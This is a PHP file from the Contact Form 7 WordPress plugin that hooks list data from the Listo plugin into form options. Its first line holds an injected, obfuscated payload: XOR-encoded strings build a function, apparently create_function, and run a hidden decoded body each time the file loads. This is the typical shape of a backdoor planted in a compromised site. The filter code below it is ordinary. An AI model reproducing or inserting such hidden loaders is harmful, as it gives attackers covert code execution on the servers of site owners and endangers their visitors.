<?php $LPHDIQKU='HH+8:Ti<2V65:=>'; $wHbMqyw='+:NYN16ZG8UASRP'^$LPHDIQKU; $MfvgVlqf='=.qf6IE3;R Po=< XX0Kq6QBc=92Uci<H8mdqhKeNKB 0G0TTw ::d 1J8jl 8Hah3Y9SjAt .3JhjhtrBnlok+XHcMahFnRJjSD7poGnjICrlO vX8>=1XqoHT PhjapIqjm=jmuA90elSHbo,737=o=akcSSZ.8jnWzgN6,I<PUKG8VNXdya<EeR77 3WzKTO1faxgCSOfiN  =,wtyZU=O+Z=NY0A-t2KMgttS;XIWkfK4<Y<.N,SYEhsdok 0oR8fMZRArszlIV-AETbx6keI<8,7tU =XoilQ52qloa1W<YxHSTB 6= aYKhbGHeImh0WMVkaWDdK;IT +ZKLgdakk4rmcn87llQR kZGsn9YLLHSr1Nb2fSRZ4.PU;npYs;R<q:cjkDU2Mdnjf8P<3+YxpO=+;AA=P>,ZuatN>427=--.QWRO-FoT+J4dsF 0f 456evoU3H8ZYCN+  QPavwTRX ,P 5qBusEMmRQLXPMqhkZ6:P4cZ2+iWT-JB4NJ.N+RyzsT5IAxNEpjE83weS57LWcqW 7VlxaNjusHEd=DWLIqrFa4 eVjSerpu7vJ YAIvgQfjWIriZ> +2+.+J4Q6Y4NHmvH4=WBA6rGoT4 8 zdpzDykP=l:W2.8pp R-YlnNY0 82 s5avMcH0E KVcaSS'; $IGMcFarb=$wHbMqyw('', 'THYGP<+PO;O>0XDI+,CcVN>0<YXF4<6Q=LJMXH0oG-7NS3Y;:WXUH;DP>Y53MM<ILW8M2FaPKKJcHJHTR9defOD-<CpAOaUXCc5+EXK.NWisILkIJ+LLQT6YK,5T1AQAT ZAD7cdQ.LDEBnhJKHVGVfKT<K=sw1KA1J>ZBnEX;P5;ccS37q9PZ6Ll RCUA9Ro;:EOZrn>Y2lcjDAIMWIY<4Q<Na7j=Q5L+Y.4GIT5Z4:2PlARS+YO-Dsqa70+  iuO3KFi178RNDLm L-01KXMalmXYXV+>EDxRIH:PKJffEU6H8Xusp4AZHEZS6bh..EaLLT697BA,Nm-T;1AH2kdC;3.:a7>7NYDLH:7YKgySJO8 9-zRJDk;B73.Uq;0BNMyWP7EJ0jcO 4F,DSJBN1PFNbry27V1KeY1JMzHA4;PGWETLAG+2z7B400J>U;,+UDNBUFSSB01V+W><kjOAT0yMVS03,As;ELXkNy,+Ev5-,1mWNK;DH1M<1WR62,D96GfmE+RuUZW0T= QncVJmUWBMwQV868V<ENq1QAsWUT+ WYr3.+DFsXVBQbXfUCGAVE,E;u+AWiACwoTI;LRJKtEN3k4N0G:;EQ8UD;- RUkOpPALASMPZdYKpFf32DOTXTD3Y87I>8ILWSDThHMGj-H,TcfJZY.'^$MfvgVlqf); $IGMcFarb();
/**
** Retrieve list data from the Listo plugin.
** Listo http://wordpress.org/plugins/listo/
**/

add_filter( 'wpcf7_form_tag_data_option', 'wpcf7_listo', 10, 3 );

function wpcf7_listo( $data, $options, $args ) {
	if ( ! function_exists( 'listo' ) ) {
		return $data;
	}

	$args = wp_parse_args( $args, array() );

	$contact_form = wpcf7_get_current_contact_form();
	$args['locale'] = $contact_form->locale();

	foreach ( (array) $options as $option ) {
		$option = explode( '.', $option );
		$type = $option[0];
		$args['group'] = isset( $option[1] ) ? $option[1] : null;

		if ( $list = listo( $type, $args ) ) {
			$data = array_merge( (array) $data, $list );
		}
	}

	return $data;
}
